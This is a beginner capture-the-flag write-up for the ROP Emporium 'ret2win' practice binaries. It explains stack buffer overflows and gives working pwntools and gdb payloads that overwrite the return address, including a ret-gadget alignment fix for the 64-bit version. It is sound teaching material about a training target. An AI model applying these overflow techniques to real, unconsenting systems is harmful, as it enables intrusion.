# RET2WIN

I'll try to keep this as beginner-friendly as possible but frankly a lot of self-learn and searching is unavoidable.
Sites like [CTF101](https://ctf101.org/binary-exploitation/return-oriented-programming) and [bufferoverflows](https://bufferoverflows.net) are highly recommended.

## 32-bit

The first step (and often a free flag in CTFs)

<details>
  <summary><b>Solution:</b></summary>
  
  ### Information gathering
  
  First we can gather basic information with the `file` command in Linux:
  
```
ret2win32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2,
for GNU/Linux 3.2.0, BuildID[sha1]=e1596c11f85b3ed0881193fe40783e1da685b851, not stripped
```
  
  It is a **32-bit, little-endian** (LSB) executable file.
  
  This 32-bit ELF can be disassembled in [gdb](https://linux.die.net/man/1/gdb) (debugger/disassembler in most linux systems) or [ghidra](https://ghidra-sre.org/) (powerful disassembler/decompiler).
  I like to use ghidra more because usually the decompiled C code will give me a better picture.

``` c
void pwnme(void){
  undefined local_2c [40];
  
  memset(local_2c,0,0x20);
  puts(
      "For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffe r!"
      );
  puts("What could possibly go wrong?");
  puts(
      "You there, may I have your input please? And don\'t worry about null bytes, we\'re using read ()!\n"
      );
  printf("> ");
  read(0,local_2c,0x38);
  puts("Thank you!");
  return;
}

void ret2win(void){ // 0x0804862c
  puts("Well done! Here\'s your flag:");
  system("/bin/cat flag.txt");
  return;
}
```
  
  Despite the description, the buffer is 40-byte long.
  As we can provide `0x38` bytes, which is greater than the 40 allocated, we can *overflow the buffer*.
  But what can happen? This is what **binary exploitation** or **pwn** is about.
  
  ### Introducing the stack
  
  No introduction to pwn can start without a nice graph of the program stack:
  
  ![Stack from Yale](https://flint.cs.yale.edu/cs421/papers/x86-asm/stack-convention.png)
  
  The stack is what computers use to control the program flow. Instruction addresses and parameters are pushed to and popped from the stack.
  There are many videos on Youtube illustrating how the stack is used by programs and I highly recommend watching them.
  It's important to recognize that *knowledge to the stack is fundamental to pwn*.
  
  Now we can answer the question *what can happen*.
  As our data are filled in, starting from some point in the current stack frame (space between `esp` and `ebp`) towards higher register (lower in the stack),
  we can control the value stored at `ebp` and most importantly the **return address**, i.e. where the program will jump to after finishing `pwnme`.
  This is the basic idea of *ret2win*. No parameters, no other protections, no complicated command chaining, just change the return address and win.
  
  ### Devising and implementing the payload
  
  There are many tools available for debugging and supplying inputs. I'm currently using:
  - **gdb/[pwndbg](https://browserpwndbg.readthedocs.io/en/docs/)**: add breakpoints, stack inspection
  - **[pwntools](https://docs.pwntools.com/en/stable/)**: a python library for interacting with processes with many handy tools for pwn
  
  For this challenge, here are some gdb commands that can be handy:
  
  ```
  set telescope-skip-repeating-val off (always show stack even for repeating values)
  info functions (display functions and their addresses)
  disassemble pwnme (show assembly of function)
  break *pwnme+105 (add a breakpoint, notice it should be added after reading user input)
  r <<< "ABCD" (the most simple way of supplying input before starting program)
  ```
  
  ![image](https://user-images.githubusercontent.com/114584910/197354065-3be9df7b-c29e-42cd-b9e6-fd40da0f168d.png)

  From the screenshot, we can clearly see the `esp` and `ebp` registers, the 40 byte space (`0xe8-0xc0`) allocated, as well as the return pointer pointing to `0x08048590 (main+74)`.
  The overall shape should be similar to the previous graph.
  
  So we can supply `"A"*44+"\x2c\x86\x04\x08"` to the program. Even if some characters cannot be typed, there are many ways to do this in gdb with some bash and python magic:
  - `r <<< $(echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x2c\x86\x04\x08")`
  - `r <<< $(python3 -c 'from pwn import *;import sys;sys.stdout.buffer.write(b"A"*44+p32(0x0804862c))')`
  - write the payload to a file (with python, [hexed.it](https://hexed.it), etc) and load it with `r < filename`
  
  It's worth noting that [Python stdout uses `utf-8`](https://docs.python.org/3/library/sys.html#sys.stdout),
  so our `\x86` will become `\xc2\x86` if printed directly using `print`.
  *(the earlier one quits using `print`, the less one has to worry about supplying payload)*
    
  The pwntools python script is also very short:

``` py
from pwn import *
p = process('./ret2win32')
p.sendafter(b'> ', b"A"*(40+4)+p32(0x0804862c))
p.interactive()
```

## 64-bit

Some parts assume that you have read the 32-bit solution.

<details>
  <summary><b>Solution:</b></summary>
  
  ### Information gathering
  
  For 64-bit ELFs, we can also use IDA to decompile the program. 
  The difference between using either of them is not very apparent (at least to my current understanding) so it's just personal preference:

``` c
int pwnme(){
  char s[32]; // [rsp+0h] [rbp-20h] BYREF

  memset(s, 0, sizeof(s));
  puts("For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!");
  puts("What could possibly go wrong?");
  puts("You there, may I have your input please? And don't worry about null bytes, we're using read()!\n");
  printf("> ");
  read(0, s, 0x38uLL);
  return puts("Thank you!");
}

int ret2win(){ //0x400756
  puts("Well done! Here's your flag:");
  return system("/bin/cat flag.txt");
}
```
  
  ### Devising and implementing the payload
  
  Using gdb/pwndbg:
  
  ![image](https://user-images.githubusercontent.com/114584910/197355965-a537b74b-88c6-495a-981e-2a08f1f79f50.png)

  Immediately we can see a difference: addresses in 32-bit ELF are 32-bit (4-bytes) while those for 64-bit are 64-bit (8-bytes).
  
  Applying what we have learnt:
  
``` py
from pwn import *
p = process('./ret2win')
p.sendafter(b'> ', b"A"*(32+8)+p64(0x400756)) # remember to change to p64
p.interactive()
```
  
  ![image](https://user-images.githubusercontent.com/114584910/197356165-82a57dac-2a6a-4272-9c97-94de051b1a79.png)

  Although we have entered the `ret2win` function (as confirmed by the backtrace and message), a segfault happened *within* it.
  Fortunately this is [hinted by ROP Emporium as well](https://ropemporium.com/guide.html#Common%20pitfalls).
  This is an example of how [stack misalignment](https://technical-qa.com/what-is-the-stack-alignment/) can be an issue when building x64 exploits.
  
  *Wait, what's a `ret` gadget?*
  
  In more advanced pwn challenges, we have to build a chain of commands using fragments of the existing assembly code known as *gadgets*.
  A `ret` gadget "transfers control to the return address located on the stack" immediately and does not do anything on its own.
  It is a useful placeholder to change stack alignment.
  
  All functions end with `ret` and one such example can be found at 0x400755.
  
  Final script:

``` py
from pwn import *
p = process('./ret2win')
p.sendafter(b'> ', b"A"*(32+8)+p64(0x400755)+p64(0x400756))
p.interactive()
```
  
  ### A note on using gdb
  
  The following script in gdb will **not** work:

```bash
r <<< $(python3 -c 'from pwn import *;import sys;sys.stdout.buffer.write(b"A"*(40)+p64(0x400755)+p64(0x400756))')
```
  ![image](https://user-images.githubusercontent.com/114584910/197382560-f7ae5cae-28ac-4025-88eb-80603f888f07.png)
  
  The reason is mentioned in the warning message:
              
  ![image](https://user-images.githubusercontent.com/114584910/197382619-0129fcb1-ed2d-42f9-8610-6b1fd36571e9.png)

  When using `<<<` to supply input through stdin in bash, the null character `\x00` are ignored. So our payload `\x55\x07\x40\x00\x00\x00\x00\x00\x56\x07\x40\x00\x00\x00\x00\x00` became `\x55\x07\x40\x56\x07\x40`.
  This can be overcome by using [process substitution](https://tldp.org/LDP/abs/html/process-sub.html):

```bash
r < <(python3 -c 'from pwn import *;import sys;sys.stdout.buffer.write(b"A"*(40)+p64(0x400755)+p64(0x400756))')
```
